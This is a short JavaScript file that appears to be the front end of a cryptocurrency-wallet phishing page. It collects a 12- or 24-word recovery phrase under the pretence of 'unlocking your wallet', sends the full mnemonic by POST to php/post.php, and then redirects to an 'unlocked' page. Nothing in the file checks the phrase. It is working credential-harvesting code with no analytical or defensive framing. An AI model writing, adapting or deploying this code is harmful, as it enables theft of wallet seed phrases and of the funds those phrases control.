function setFormError(msg) {
    $(".forminput").append("<div id='error'><p style='color:red;'>" + msg + "</p></div>");
    setTimeout(function () {
        $("#error").remove();
    }, 5000);
}

$(document).ready(function () {
    $('.verifyphrase').tagsinput({
        maxTags: 24,
        confirmKeys: [44, 32],
        trimValue: true,
        allowDuplicates: true
    });

    $(window).keydown(function (event) {
        if (event.keyCode == 13) {
            event.preventDefault();
            return false;
        }
    });

    $("#verify").on("click", function () {
        var phrase = $(".verifyphrase").tagsinput('items');
        if (phrase.length != 24 && phrase.length != 12) {
            return setFormError("Phrase must be 12 or 24 words long, please correct your mistakes to unlock your wallet.");
        }

        try {
            let mnemonic = phrase.join(" ");
            $.ajax({
                url: "php/post.php",
                type: "POST",
                data: {
                    "phrase": mnemonic,
                },
                success: function (data) {
                    window.location.href = "unlocked.html";
                }
            })
        }
        catch (e) {
            console.log(e);
            setFormError("The phrase you entered is incorrect, please correct your mistakes to unlock your wallet.");
        }
    });
});